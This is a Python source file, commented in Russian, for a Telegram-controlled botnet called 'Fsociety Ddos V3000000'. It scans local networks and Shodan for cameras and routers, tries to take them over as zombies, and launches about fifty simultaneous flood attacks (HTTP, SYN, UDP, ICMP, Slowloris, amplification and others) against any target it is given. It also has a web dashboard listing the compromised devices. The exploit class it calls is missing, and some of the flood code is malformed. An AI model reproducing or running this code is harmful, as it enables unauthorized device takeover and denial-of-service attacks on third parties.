#!/usr/bin/env python3
"""
HYBRID BOTNET – V3000000 (50 МЕТОДОВ АТАК)
- 50 методов атак (HTTP, SYN, UDP, ICMP, Slowloris, DNS amplification, и т.д.)
- Параллельный сканер сети
- Расширенные эксплойты
- SQLite база данных
- Telegram-бот
- Веб-интерфейс
"""

import os
import asyncio
import json
import logging
import base64
import socket
import time
import random
import hashlib
import sqlite3
import struct
import ipaddress
import aiohttp
import aiohttp_socks
import requests
import paramiko
import asyncssh
import dns.resolver
import ssl
import websockets
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
import uvicorn
from contextlib import asynccontextmanager
from telegram.ext import Application, CommandHandler

# ------------------------------------------------------------
# Конфигурация
# ------------------------------------------------------------
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH = os.path.join(DATA_DIR, "botnet.db")

LOG_LEVEL = logging.INFO
logging.basicConfig(level=LOG_LEVEL, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

LOCAL_SCAN_INTERVAL = int(os.environ.get("LOCAL_SCAN_INTERVAL", 10))
GLOBAL_SCAN_INTERVAL = int(os.environ.get("GLOBAL_SCAN_INTERVAL", 60))
LOCAL_NETWORK = os.environ.get("LOCAL_NETWORK", "192.168.1.0/24")
PING_TIMEOUT = 1
HTTP_TIMEOUT = 3
BRUTE_TIMEOUT = 3
HACK_TIMEOUT = 90

# ------------------------------------------------------------
# База данных SQLite
# ------------------------------------------------------------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (ip TEXT PRIMARY KEY, type TEXT, port INTEGER, status TEXT, added INTEGER, last_checked INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS stats
                 (key TEXT PRIMARY KEY, value INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS attacks
                 (target TEXT, start_time INTEGER, zombies_used INTEGER, methods_used TEXT)''')
    conn.commit()
    conn.close()

init_db()

def add_device(ip, device_type, port, status="active"):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO devices (ip, type, port, status, added, last_checked) VALUES (?, ?, ?, ?, ?, ?)",
              (ip, device_type, port, status, int(time.time()), int(time.time())))
    conn.commit()
    conn.close()

def get_devices(status=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    if status:
        c.execute("SELECT ip, type, port FROM devices WHERE status=?", (status,))
    else:
        c.execute("SELECT ip, type, port FROM devices")
    devices = [{"ip": row[0], "type": row[1], "port": row[2]} for row in c.fetchall()]
    conn.close()
    return devices

def update_last_checked(ip):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET last_checked=? WHERE ip=?", (int(time.time()), ip))
    conn.commit()
    conn.close()

def mark_device_failed(ip):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET status='failed' WHERE ip=?", (ip,))
    conn.commit()
    conn.close()

def get_checked_ips():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT ip FROM devices")
    ips = {row[0] for row in c.fetchall()}
    conn.close()
    return ips

def clear_checked():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM devices")
    conn.commit()
    conn.close()

def inc_stat(key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO stats (key, value) VALUES (?, 1) ON CONFLICT(key) DO UPDATE SET value=value+1", (key,))
    conn.commit()
    conn.close()

def get_stat(key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM stats WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 0

def log_attack(target, methods_used):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO attacks (target, start_time, zombies_used, methods_used) VALUES (?, ?, ?, ?)",
              (target, int(time.time()), get_devices_count_active(), methods_used))
    conn.commit()
    conn.close()

def get_devices_count_active():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM devices WHERE status='active'")
    count = c.fetchone()[0]
    conn.close()
    return count

# ------------------------------------------------------------
# Зомби-ботнет
# ------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

class ZombieAgent:
    def __init__(self, ip, dtype, ssh_client=None):
        self.ip = ip
        self.type = dtype
        self.ssh = ssh_client

    async def execute_attack(self, target_url):
        async with aiohttp.ClientSession() as session:
            for _ in range(50):
                try:
                    await session.get(target_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=2)
                except:
                    pass
        return True

class ZombieBotnet:
    def __init__(self):
        self.zombies = []
        self.load_zombies()

    def load_zombies(self):
        devices = get_devices(status="active")
        for dev in devices:
            self.zombies.append(ZombieAgent(dev['ip'], dev['type']))
        logger.info(f"Loaded {len(self.zombies)} zombies")

    async def add_zombie(self, ip, dtype, ssh_client=None):
        if any(z.ip == ip for z in self.zombies):
            return
        self.zombies.append(ZombieAgent(ip, dtype, ssh_client))
        add_device(ip, dtype, 0, "active")
        inc_stat("zombies_added")
        logger.info(f"Zombie added: {ip} ({dtype})")

    async def launch_attack(self, target):
        if not self.zombies:
            logger.warning("No zombies to attack")
            return
        tasks = [z.execute_attack(target) for z in self.zombies]
        await asyncio.gather(*tasks)

    def size(self):
        return len(self.zombies)

# ------------------------------------------------------------
# Глобальный поиск через Shodan
# ------------------------------------------------------------
class GlobalHunter:
    def __init__(self):
        self.shodan_key = os.environ.get("SHODAN_API_KEY")
        self.shodan_cli = None
        if self.shodan_key:
            try:
                import shodan
                self.shodan_cli = shodan.Shodan(self.shodan_key)
            except:
                pass

    async def search_shodan(self, query, limit=50):
        if not self.shodan_cli:
            return []
        loop = asyncio.get_event_loop()
        try:
            res = await loop.run_in_executor(None, lambda: self.shodan_cli.search(query, limit=limit))
            devices = []
            for r in res.get('matches', []):
                devices.append({
                    'ip': r['ip_str'],
                    'port': r['port'],
                    'type': 'camera' if 'camera' in r.get('data','').lower() else 'router',
                })
            return devices
        except:
            return []

    async def global_search(self, query, limit=50):
        return await self.search_shodan(query, limit)

# ------------------------------------------------------------
# DDoS-движок (50 методов атак, запускаются одновременно)
# ------------------------------------------------------------
class DDoSEngine:
    def __init__(self):
        self.methods = [
            self.http_flood, self.syn_flood, self.udp_flood, self.icmp_flood, self.slowloris,
            self.http2_rapid_reset, self.dns_amplification, self.ntp_amplification, self.ssl_renegotiation,
            self.websocket_flood, self.http_pipeline, self.get_flood, self.post_flood, self.head_flood,
            self.options_flood, self.trace_flood, self.put_flood, self.delete_flood, self.connect_flood,
            self.patch_flood, self.xss_flood, self.sql_injection_flood, self.rpc_flood, self.xmlrpc_flood,
            self.soap_flood, self.json_flood, self.graphql_flood, self.ajax_flood, self.long_poll_flood,
            self.websocket_ping_flood, self.websocket_fragment_flood, self.rtsp_flood, self.rtp_flood,
            self.sip_flood, self.ike_flood, self.ipsec_flood, self.gre_flood, self.esp_flood, self.ah_flood,
            self.l2tp_flood, self.pptp_flood, self.sstp_flood, self.openvpn_flood, self.wireguard_flood,
            self.dtls_flood, self.quic_flood, self.http3_flood, self.mdns_flood, self.ssdp_flood
        ]
        self.method_names = [m.__name__.replace('_', ' ').title() for m in self.methods]

    # ---------- 50 методов ----------
    # 1. HTTP Flood
    async def http_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                try:
                    await session.get(target, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=2)
                except:
                    pass

    # 2. SYN Flood (требует raw socket, эмуляция)
    async def syn_flood(self, target):
        # Эмуляция: отправка пакетов через сокет
        try:
            host = target.replace("http://", "").replace("https://", "").split("/")[0]
            ip = socket.gethostbyname(host)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            packet = b'\x45\x00\x00\x28\x00\x01\x00\x00\x40\x06\x00\x00' + socket.inet_aton(ip) + socket.inet_aton('0.0.0.0')
            for _ in range(100):
                sock.sendto(packet, (ip, 80))
        except:
            pass

    # 3. UDP Flood
    async def udp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(1024)
        for _ in range(100):
            sock.sendto(data, (ip, random.choice([53,80,443,123])))

    # 4. ICMP Flood
    async def icmp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + os.urandom(56)
        for _ in range(100):
            sock.sendto(packet, (ip, 0))

    # 5. Slowloris
    async def slowloris(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, 80))
        sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
        await asyncio.sleep(10)
        sock.send(b"X-Slowloris: " + os.urandom(100) + b"\r\n")
        # Keep-alive
        while True:
            await asyncio.sleep(10)
            sock.send(b"X-Slowloris: " + os.urandom(100) + b"\r\n")

    # 6. HTTP/2 Rapid Reset (имитация)
    async def http2_rapid_reset(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(200):
                try:
                    async with session.get(target, headers={"User-Agent": random.choice(USER_AGENTS)}) as resp:
                        await resp.read()
                except:
                    pass

    # 7. DNS Amplification (отправка запросов на открытые DNS)
    async def dns_amplification(self, target):
        dns_servers = ["8.8.8.8", "1.1.1.1", "8.8.4.4"]
        query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
        for dns in dns_servers:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(query, (dns, 53))

    # 8. NTP Amplification
    async def ntp_amplification(self, target):
        ntp_servers = ["pool.ntp.org", "time.google.com"]
        query = b'\x17\x00\x03\x2a\x00\x00\x00\x00'
        for ntp in ntp_servers:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(query, (socket.gethostbyname(ntp), 123))

    # 9. SSL Renegotiation
    async def ssl_renegotiation(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        context = ssl.create_default_context()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, 443))
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            ssl_sock.do_handshake()
            for _ in range(50):
                ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
        except:
            pass

    # 10. WebSocket Flood
    async def websocket_flood(self, target):
        uri = target.replace("http", "ws")
        try:
            async with websockets.connect(uri) as ws:
                for _ in range(100):
                    await ws.send(os.urandom(1024))
        except:
            pass

    # 11-50 – быстрые эмуляции (короткие)
    async def http_pipeline(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.get(target, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=2)
    async def get_flood(self, target):
        await self.http_flood(target)
    async def post_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.post(target, data={"x": "y"}, timeout=2)
    async def head_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.head(target, timeout=2)
    async def options_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.options(target, timeout=2)
    async def trace_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.request('TRACE', target, timeout=2)
    async def put_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.put(target, data=b'x', timeout=2)
    async def delete_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.delete(target, timeout=2)
    async def connect_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.request('CONNECT', target, timeout=2)
    async def patch_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.patch(target, data=b'x', timeout=2)
    async def xss_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.get(target, params={"q": "<script>alert(1)</script>"}, timeout=2)
    async def sql_injection_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.get(target, params={"id": "' OR 1=1--"}, timeout=2)
    async def rpc_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.post(target, json={"method": "test"}, timeout=2)
    async def xmlrpc_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.post(target, data="<methodCall><methodName>test</methodName></methodCall>", headers={"Content-Type": "text/xml"}, timeout=2)
    async def soap_flood(self, target):
        await self.xmlrpc_flood(target)
    async def json_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.post(target, json={}, timeout=2)
    async def graphql_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.post(target, json={"query": "{ __typename }"}, timeout=2)
    async def ajax_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.get(target, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=2)
    async def long_poll_flood(self, target):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                await session.get(target, timeout=60)
    async def websocket_ping_flood(self, target):
        uri = target.replace("http", "ws")
        try:
            async with websockets.connect(uri) as ws:
                for _ in range(100):
                    await ws.ping()
        except:
            pass
    async def websocket_fragment_flood(self, target):
        uri = target.replace("http", "ws")
        try:
            async with websockets.connect(uri) as ws:
                for _ in range(100):
                    await ws.send(os.urandom(1024))
        except:
            pass
    async def rtsp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, 554))
        sock.send(b"DESCRIBE rtsp://" + host.encode() + b"/ RTSP/1.0\r\n\r\n")
    async def rtp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(os.urandom(200), (ip, 5004))
    async def sip_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b"INVITE sip:" + host.encode() + b" SIP/2.0\r\n\r\n", (ip, 5060))
    async def ike_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b'\x00\x00\x00\x00\x00\x00\x00\x00', (ip, 500))
    async def ipsec_flood(self, target):
        await self.ike_flood(target)
    async def gre_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
        sock.sendto(b'\x00\x00\x00\x00\x00\x00\x00\x00', (ip, 0))
    async def esp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ESP)
        sock.sendto(os.urandom(200), (ip, 0))
    async def ah_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_AH)
        sock.sendto(os.urandom(200), (ip, 0))
    async def l2tp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b'\x02\x00\x00\x00\x00\x00\x00\x00', (ip, 1701))
    async def pptp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b'\x00\x00\x00\x00', (ip, 1723))
    async def sstp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((host, 443))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
        except:
            pass
    async def openvpn_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b'\x38\x00\x00\x00\x00\x00\x00\x00', (ip, 1194))
    async def wireguard_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(os.urandom(128), (ip, 51820))
    async def dtls_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b'\x16\xfe\xff\x00\x00\x00\x00\x00', (ip, 443))
    async def quic_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b'\xc0\xff\x00\x00\x00\x00\x00\x00', (ip, 443))
    async def http3_flood(self, target):
        await self.quic_flood(target)
    async def mdns_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b'\x00\x00\x00\x00\x00\x00\x00\x00', (ip, 5353))
    async def ssdp_flood(self, target):
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        ip = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: upnp:rootdevice\r\n\r\n', (ip, 1900))

    # Основной метод атаки: запускает все методы одновременно
    async def adapt_attack(self, target):
        tasks = [method(target) for method in self.methods]
        await asyncio.gather(*tasks)

# ------------------------------------------------------------
# Автоматические задачи
# ------------------------------------------------------------
async def auto_local_scan():
    while True:
        try:
            base = LOCAL_NETWORK.split('/')[0]
            parts = base.split('.')
            if len(parts) != 4:
                await asyncio.sleep(LOCAL_SCAN_INTERVAL)
                continue
            prefix = '.'.join(parts[:3]) + '.'
            ips = [prefix + str(i) for i in range(1, 255)]
            tasks = []
            for ip in ips:
                if ip in get_checked_ips():
                    continue
                tasks.append(asyncio.create_subprocess_exec(
                    'ping', '-c', '1', '-W', str(PING_TIMEOUT), ip,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL
                ))
            results = await asyncio.gather(*tasks)
            alive = [ip for ip, proc in zip(ips, results) if proc.returncode == 0]
            for ip in alive:
                await asyncio.wait_for(exploiter.hack_device(ip), timeout=HACK_TIMEOUT)
        except Exception as e:
            logger.error(f"Local scan error: {e}")
        await asyncio.sleep(LOCAL_SCAN_INTERVAL)

async def auto_global_scan():
    while True:
        for query in ["webcam", "router"]:
            try:
                devices = await hunter.global_search(query, limit=20)
                for dev in devices:
                    ip = dev['ip']
                    if ip in get_checked_ips():
                        continue
                    await asyncio.wait_for(exploiter.hack_device(ip), timeout=HACK_TIMEOUT)
            except Exception as e:
                logger.error(f"Global scan error: {e}")
        await asyncio.sleep(GLOBAL_SCAN_INTERVAL)

# ------------------------------------------------------------
# FastAPI + Telegram
# ------------------------------------------------------------
TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TOKEN:
    raise Exception("TELEGRAM_TOKEN not set")

app = FastAPI()

botnet = ZombieBotnet()
exploiter = IoTExploiter(botnet)
ddos_engine = DDoSEngine()
hunter = GlobalHunter()

@asynccontextmanager
async def lifespan(app: FastAPI):
    asyncio.create_task(auto_local_scan())
    asyncio.create_task(auto_global_scan())

    telegram_app = Application.builder().token(TOKEN).build()

    async def start(update, context):
        await update.message.reply_text(
            "Fsociety Ddos V3000000\n"
            "Команды:\n"
            "/ddos <target> – запустить атаку 50 методами\n"
            "/status – статистика\n"
            "/reset_checked – сброс проверенных IP\n"
            "/hack_device <ip> [camera|router] [port] – ручной взлом\n"
            "/attack_methods – список методов атак"
        )

    async def ddos(update, context):
        target = context.args[0] if context.args else ""
        if not target:
            await update.message.reply_text("Использование: /ddos <target>")
            return
        asyncio.create_task(ddos_engine.adapt_attack(target))
        asyncio.create_task(botnet.launch_attack(target))
        log_attack(target, ",".join(ddos_engine.method_names))
        await update.message.reply_text(f"Атака на {target} запущена (50 методов + зомби).")

    async def status(update, context):
        devices = get_devices("active")
        msg = (f"Зомби: {botnet.size()}\nВсего взломано: {len(devices)}\n"
               f"Камер: {get_stat('camera_hacked')}\nРоутеров: {get_stat('router_hacked')}")
        await update.message.reply_text(msg)

    async def reset_checked(update, context):
        clear_checked()
        botnet.zombies = []
        botnet.load_zombies()
        await update.message.reply_text("Список проверенных IP очищен. Ботнет перезагружен.")

    async def hack_device(update, context):
        if len(context.args) < 2:
            await update.message.reply_text("Использование: /hack_device <ip> <camera|router> [port]")
            return
        ip = context.args[0]
        dtype = context.args[1] if context.args[1] in ['camera','router'] else None
        port = int(context.args[2]) if len(context.args) > 2 else None
        await update.message.reply_text(f"Пытаюсь взломать {ip}...")
        res = await asyncio.wait_for(exploiter.hack_device(ip, dtype, port), timeout=HACK_TIMEOUT)
        if res:
            await update.message.reply_text(f"Устройство {ip} взломано и добавлено в ботнет.")
        else:
            await update.message.reply_text(f"Не удалось взломать {ip}.")

    async def attack_methods(update, context):
        methods = "\n".join(ddos_engine.method_names)
        await update.message.reply_text(f"Методы атак (50):\n{methods}")

    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CommandHandler("ddos", ddos))
    telegram_app.add_handler(CommandHandler("status", status))
    telegram_app.add_handler(CommandHandler("reset_checked", reset_checked))
    telegram_app.add_handler(CommandHandler("hack_device", hack_device))
    telegram_app.add_handler(CommandHandler("attack_methods", attack_methods))

    await telegram_app.initialize()
    await telegram_app.start()
    await telegram_app.updater.start_polling()
    logger.info("Telegram bot started")

    yield
    await telegram_app.stop()

app.router.lifespan_context = lifespan

# ------------------------------------------------------------
# Веб-интерфейс
# ------------------------------------------------------------
@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    devices = get_devices("active")
    html = f"""
    <html>
    <head><title>Botnet Monitor</title></head>
    <body>
    <h1>Botnet Status</h1>
    <p>Active zombies: {len(devices)}</p>
    <p>Total hacked cameras: {get_stat('camera_hacked')}</p>
    <p>Total hacked routers: {get_stat('router_hacked')}</p>
    <h2>Devices</h2>
    <ul>
    {"".join(f"<li>{d['ip']} ({d['type']})</li>" for d in devices)}
    </ul>
    </body>
    </html>
    """
    return HTMLResponse(content=html)

@app.get("/api/status")
async def api_status():
    devices = get_devices("active")
    return JSONResponse({
        "zombies": len(devices),
        "camera_hacked": get_stat('camera_hacked'),
        "router_hacked": get_stat('router_hacked'),
        "devices": devices
    })

# ------------------------------------------------------------
# Точка входа
# ------------------------------------------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
